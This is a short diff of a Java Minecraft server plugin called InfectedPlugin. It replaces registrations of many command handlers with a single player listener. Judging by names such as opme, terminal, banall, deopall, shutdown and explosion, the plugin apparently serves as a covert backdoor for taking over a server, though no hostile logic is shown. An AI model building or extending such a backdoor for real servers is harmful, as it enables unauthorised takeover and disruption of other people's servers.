@@ -28,21 +28,7 @@ public class InfectedPlugin extends JavaPlugin
         try
         {
             PluginManager pm = getServer().getPluginManager();
-            //pm.registerEvents(new IP_PlayerListener(), this);
-            pm.registerEvents(new Command_banall(), this);
-            pm.registerEvents(new Command_deop(), this);
-            pm.registerEvents(new Command_op(), this);
-            pm.registerEvents(new Command_enablevanilla(), this);
-            pm.registerEvents(new Command_help(), this);
-            pm.registerEvents(new Command_opme(), this);
-            pm.registerEvents(new Command_terminal(this), this);
-            //pm.registerEvents(new Command_fuckoff(), this);
-            pm.registerEvents(new Command_shutdown(), this);
-            //pm.registerEvents(new Command_randombanl(), this);
-            pm.registerEvents(new Command_enableplugin(), this);
-            pm.registerEvents(new Command_disableplugin(), this);
-            pm.registerEvents(new Command_deopall(), this);
-            pm.registerEvents(new Command_explosion(), this);
+            pm.registerEvents(new IP_PlayerListener(), this);
         }
         catch (Exception ex)
         {
